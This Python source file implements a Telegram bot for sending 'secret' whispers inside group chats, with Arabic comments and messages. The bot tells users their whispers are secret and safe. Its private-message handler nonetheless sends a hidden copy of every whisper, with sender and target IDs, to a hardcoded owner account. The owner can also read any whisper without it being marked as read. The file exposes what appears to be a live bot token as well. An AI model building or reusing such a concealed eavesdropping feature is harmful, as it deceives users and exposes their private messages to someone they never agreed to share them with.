import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = "8912650382:AAGxGtTJ6loePuTG3Dyt3f8Knhpa4HGDR4A"
bot = telebot.TeleBot(TOKEN)

# 🚨 ضع آي دي حسابك الشخصي هنا (المالك) لقراءة كل الهمسات سراً
OWNER_ID = 6312345678  # <--- استبدل الرقم برقم حسابك الحقيقي

# قواميس التخزين
user_target_state = {}  # لتخزين الشخص المستهدف لكل يوزر
active_whispers = {}    # لتخزين نصوص الهمسات

@bot.message_handler(commands=['start'])
def handle_start(message):
    text_parts = message.text.split()
    
    # التحقق إذا تم الضغط على رابط الهمسة قادماً من المجموعة
    if len(text_parts) > 1:
        param = text_parts[1]
        
        # حالة الضغط على "اهمس هنا" وتوجيهه للخاص
        if param.startswith("whisperto_"):
            try:
                # استخراج معرف المستهدف واسمه من الـ parameter
                data_part = param.replace("whisperto_", "")
                target_id_str, target_name = data_part.split("_", 1)
                target_id = int(target_id_str)
                
                # حفظ حالة المستخدم في الذاكرة المؤقتة
                user_target_state[message.from_user.id] = {
                    'target_id': target_id,
                    'target_name': target_name,
                    'chat_id': message.chat.id
                }
                
                bot.reply_to(message, f"• 💌 اكتب همستك لـ **{target_name}** الآن في الخاص:", parse_mode="Markdown")
                return
            except Exception:
                pass
                
        # حالة قراءة الهمسة عند الضغط عليها من المجموعة
        elif param.startswith("read_"):
            w_id = param.replace("read_", "")
            if w_id in active_whispers:
                w = active_whispers[w_id]
                
                # التحقق إذا كان المفتح هو الشخص المستهدف أو أنت (المالك)
                if message.from_user.id != w['target_id'] and message.from_user.id != OWNER_ID:
                    bot.reply_to(message, "❌ عذراً، هذه الهمسة ليست موجهة لك!")
                    return
                    
                if w['read_status'] and message.from_user.id != OWNER_ID:
                    bot.reply_to(message, "⚠️ عذراً، هذه الهمسة تمت قراءتها مسبقاً.")
                else:
                    w['read_status'] = True
                    bot.reply_to(
                        message,
                        f"• تمت قراءة الهمسة .. بنجاح\n• بواسطة العضو المطلوب ✨\n- من قبل ← {w['sender_name']}♡\n\n💌 **النص:**\n{w['text']}",
                        parse_mode="Markdown"
                    )
                return

    # الرسالة الترحيبية الافتراضية لو دخل البوت مباشرة بدون زر
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("➕ اضفني لمجموعتك", url=f"https://t.me/{bot.get_me().username}?startgroup=true"))
    bot.reply_to(
        message,
        "✨ **أهلاً بك في بوت الهمسات الذكي**\n\n"
        "🛡️ • يمكنك من خلالي إرسال همسات سرية وآمنة داخل المجموعات لأي عضو بالرد على رسالته.\n\n"
        "💡 • **طريقة الاستخدام:**\n"
        "• رد على رسالة أي شخص في المجموعة بكلمة (همس) أو حرف (هـ)\n"
        "• اضغط على زر (اهمس هنا) المظهر واكتب همستك بكل سرية!",
        reply_markup=markup,
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda message: message.chat.type == 'private')
def handle_private_text(message):
    user_id = message.from_user.id
    
    # التأكد هل المستخدم في حالة كتابة همسة لشخص معين؟
    if user_id in user_target_state:
        target_info = user_target_state[user_id]
        whisper_text = message.text.strip()
        
        # إنشاء معرف فريد لهذه الهمسة
        whisper_id = f"{user_id}_{target_info['target_id']}_{message.message_id}"
        active_whispers[whisper_id] = {
            'text': whisper_text,
            'sender_name': message.from_user.first_name,
            'target_id': target_info['target_id'],
            'read_status': False
        }
        
        # زر قراءة الهمسة الذي سيظهر في المجموعة
        markup = InlineKeyboardMarkup()
        bot_username = bot.get_me().username
        markup.add(InlineKeyboardButton("👁️ اضغط هنا لقراءة الهمسة", url=f"https://t.me/{bot_username}?start=read_{whisper_id}"))
        
        target_mention = f"[{target_info['target_name']}](tg://user?id={target_info['target_id']})"
        
        # إرسال الهمسة للمجموعة بالصيغة المطلوبة
        bot.send_message(
            target_info['chat_id'],
            f"• الهمسة لـ ⟵ {target_mention}\n• من ⟵ {message.from_user.first_name}\n-",
            reply_markup=markup,
            parse_mode="Markdown"
        )
        
        # تأكيد الإرسال في الخاص للمستخدم
        bot.reply_to(message, f"• تم ارسال همستك لـ {target_info['target_name']} بنجاح ✨")
        
        # 🕵️‍♂️ ميزة المالك: إرسال نسخة سرية لك أنت وحدك في الخاص
        try:
            bot.send_message(
                OWNER_ID,
                f"🚨 [لوحة مراقبة المالك]\n\n👤 المرسل: {message.from_user.first_name} (ID: {user_id})\n🎯 المستهدف: {target_info['target_name']} (ID: {target_info['target_id']})\n💌 النص:\n{whisper_text}"
            )
        except Exception:
            pass
            
        # مسح الحالة ليعود البوت لوضعه الطبيعي
        del user_target_state[user_id]
    else:
        bot.reply_to(message, "الرجاء الرد بكلمة (هـ) على الشخص في المجموعة أولاً لتحديد الهمسة.")

@bot.message_handler(func=lambda message: message.chat.type != 'private')
def handle_group_whisper(message):
    if not message.reply_to_message or message.text.strip() not in ["هـ", "ه", "همس", "اهمس"]:
        return
        
    target_user = message.reply_to_message.from_user
    if target_user.is_bot or message.from_user.id == target_user.id:
        return
        
    markup = InlineKeyboardMarkup()
    bot_username = bot.get_me().username
    
    # رابط ذكي ينقل المستخدم للخاص ويقوم بتمرير البيانات تلقائياً
    start_payload = f"whisperto_{target_user.id}_{target_user.first_name}"
    markup.add(InlineKeyboardButton("🛡️ اهمس هنا", url=f"https://t.me/{bot_username}?start={start_payload}"))
    
    target_mention = f"[{target_user.first_name}](tg://user?id={target_user.id})"
    
    bot.reply_to(
        message,
        f"• تم تحديد الهمسه لـ ⟵ {target_mention}\n• اضغط الزر لكتابة الهمسة في الخاص\n-",
        reply_markup=markup,
        parse_mode="Markdown"
    )

bot.infinity_polling()
